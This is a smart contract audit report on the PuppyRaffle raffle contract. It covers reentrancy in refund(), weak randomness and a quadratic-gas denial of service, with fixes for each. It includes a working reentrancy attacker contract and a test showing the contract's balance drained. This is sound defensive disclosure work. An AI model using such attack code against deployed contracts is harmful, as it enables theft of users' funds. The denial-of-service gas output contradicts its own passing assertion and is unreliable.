# PuppyRaffle Smart Contract Security Audit

## [High Severity] [High Severity] Reentrancy in refund() Due to Improper State Ordering

### Description 

The `refund` function sends funds to `msg.sender` before updating the contract state. This violates the Checks-Effects-Interactions pattern, leaving the contract vulnerable to reentrancy attacks. A malicious contract could repeatedly call `refund()` before the players array is updated, draining all funds.

```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "Only the player can refund");
    require(playerAddress != address(0), "Already refunded or inactive");

    payable(msg.sender).sendValue(entranceFee); // 🔴 External call before state change
    players[playerIndex] = address(0);
    emit RaffleRefunded(playerAddress);
}
```

### Impact

- **Loss of Funds**: Malicious actors can recursively trigger refund() to empty the contract balance.
- **Loss of trust**: Users may lose confidence in the raffle due to exploitability.

### Proof of Concept

If a malicoius actor deploys their own contract that can use `enterRaffle` during reentrancy, they can drain all funds from the `Raffle` smart contract.
To replicate this attack, add the `MalicousAttack` smart contract to the `PuppyRaffleTest` and run the test provided below.

``` solidity
contract ReentrancyAttack {
    PuppyRaffle public puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(address _puppyRaffle) {
        puppyRaffle = PuppyRaffle(_puppyRaffle);
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    function _stealFunds() internal {
        uint256 balance = address(puppyRaffle).balance;
        if (balance > 0) {
            puppyRaffle.refund(attackerIndex);
        }
    }

    fallback() external payable {
        _stealFunds();
    }

    receive() external payable {
        _stealFunds();
    }
}

function testReentrancyRefund() public playerEntered {
        address[] memory players = new address[](4);
        players[0] = makeAddr("playerOne-1");
        players[1] = makeAddr("playerTwo-2");
        players[2] = makeAddr("playerThree-3");
        players[3] = makeAddr("playerFour-4");
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        ReentrancyAttack attackContract = new ReentrancyAttack(address(puppyRaffle));
        address attacker = makeAddr("attacker");
        vm.deal(attacker, 1 ether);

        uint256 initialBalance = address(attackContract).balance;
        uint256 initialPuppyBalance = address(puppyRaffle).balance;

        vm.prank(attacker);
        attackContract.attack{value: entranceFee}();

        console.log("Initial attacker balance:", initialBalance);
        console.log("Initial PuppyRaffle balance:", initialPuppyBalance);

        console.log("Attacker balance after attack:", address(attackContract).balance);
        console.log("PuppyRaffle balance after attack:", address(puppyRaffle).balance);
    }
```
#### Steps to run the test

1. Install packages and Compile project:

```bash
make 
```

1. Run the test:

```bash
forge test --mt testReentrancyRefund -vvv
```

Console output:

```
Ran 1 test for test/PuppyRaffleTest.t.sol:PuppyRaffleTest
[PASS] testReentrancyRefund() (gas: 727346)
Logs:
  Initial attacker balance: 0 ETH
  Initial PuppyRaffle balance: 5 ETH
  Attacker balance after attack: 6 ETH
  PuppyRaffle balance after attack: 0 ETH
```

### Recommended Mitigations

- **Use Checks-Effects-Interactions**:
  
```solidity
players[playerIndex] = address(0);//update the player array before sending ETH
payable(msg.sender).sendValue(entranceFee);
```

- Add OpenZeppelin’s nonReentrant modifier.

## [High Severity] Predictable Randomness in selectWinner() Enables Manipulation

## Description

The contract uses `keccak256(block.timestamp, block.difficulty, msg.sender)` to generate randomness in `selectWinner()` and determine NFT rarity. These values can be influenced by miners or replayed.

```solidity
uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
```

### Impact

-**Winner Manipulation**: Miners can skew results toward a desired address.
-**NFT Rarity Bias**: Malicious users can game rarity distribution by spamming transactions.

### Recommended Mitigations

- Integrate a verifiable random function (e.g., Chainlink VRF).
- Avoid relying on block.timestamp or block.difficulty for randomness.

## [Medium Severity] Gas-Based Denial of Service in Duplicate Check

### Description

In the `enterRaffle()` function, the contract checks for duplicate addresses by comparing each new player against every existing `players` using a nested loop. This results in a quadratic time complexity (O(n²)). As the players array grows, each new call becomes increasingly expensive, potentially making it unaffordable for late entrants, leading to a Denial of Service (DoS).

```solidity
 // Check for duplicates
  for (uint256 i = 0; i < players.length - 1; i++) {
    for (uint256 j = i + 1; j < players.length; j++) {
    require(players[i] != players[j], "PuppyRaffle: Duplicate player");
    }
  }
```

### Impact

- **Scalability bottleneck**: Gas costs grow rapidly as more users enter.
- **DoS risk**: Attackers can bloat the array to block further participation.
- **User frustration**: Later users may face higher costs or failed entries.

### Proof of Concept

If the raffle has 2 sets of 100 players participating, the first 100 players pay less than the second set of 100 players.

``` solidity
// Note: Gas usage may vary slightly across EVMs. 
// This test highlights the growing cost trend as players increase.
function testDenialOfService() public {
        vm.txGasPrice(1);
        uint256 playerNum = 100;
        address[] memory players = new address[](playerNum);

        for (uint256 i = 0; i < playerNum; i++) {
            players[i] = address(i);
        }

        uint256 gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
        uint256 gasEnd = gasleft();
        uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;
        console.log("Gas used for first 100 players:", gasUsedFirst);

        //For the second 100 players
        address[] memory playersTwo = new address[](playerNum);

        for (uint256 i = 0; i < playerNum; i++) {
            playersTwo[i] = address(i + playerNum);
        }

        uint256 gasStartSecond = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * playersTwo.length}(playersTwo);
        uint256 gasEndSecond = gasleft();
        uint256 gasUsedSecond = (gasStartSecond - gasEndSecond) * tx.gasprice;
        console.log("Gas used for second 100 players:", gasUsedSecond);

        assertTrue(gasUsedFirst < gasUsedSecond);
    }
```

#### Steps to run the test

1. Install packages and Compile project:

```bash
make 
```

1. Run the test:

```bash
forge test --mt testDenialOfService -vvv
```

Console output:

```
[PASS] test_denialOfService() (gas: 25536402)

Logs:
  Gas used for first 100 players: 6503275
  Gas used for second 100 players: 1899551
```

### Recommended Mitigations

- Replace duplicate checks with a mapping (mapping(address => bool) hasEntered) to enforce uniqueness in constant time (O(1)).

- Alternatively, drop duplicate checks entirely, accepting that users may re-enter with new wallets — as sybil resistance is hard to enforce on-chain anyway.

- If one-entry-per-user is critical, implement off-chain or zk-based identity systems to enforce uniqueness more effectively.
